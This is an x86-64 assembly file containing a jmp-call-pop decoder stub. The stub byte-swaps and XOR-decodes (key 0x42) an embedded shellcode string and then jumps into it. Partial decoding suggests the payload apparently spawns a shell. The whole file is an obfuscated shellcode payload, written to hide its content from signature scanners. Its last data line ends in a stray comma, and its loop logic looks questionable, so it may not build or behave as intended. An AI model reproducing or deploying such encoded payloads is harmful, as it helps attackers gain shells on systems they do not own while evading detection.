section .text

global _start

_start:
	jmp short shellcodestr

run: 
	pop rbx
	mov r10,rbx
	xor rdi,rdi
	xor rcx,rcx

	jmp decode

comp:
	inc rcx
	cmp rcx,0x1c
	jge xoring

decode:
	mov edi,dword[rbx+rcx]
	bswap edi
	mov dword[rbx+rcx],edi
	add rcx,4
	
	loop comp

xoring:
	push 28
	pop rcx

xored:
	xor byte[r10],0x42
	inc r10
	loop xored

	jmp short shellcode

shellcodestr:
	call run
	shellcode : db 0x12,0x82,0x73,0x0a,0x6d,0x6d,0xfc,0x0a,0x6d,0x2c,0x2b,0x20,0x0a,0x14,0x2a,0x31,0x73,0x0a,0xa5,0xcb,0x90,0x73,0x0a,0xb4,0x47,0x4d,0x79,0xf2,

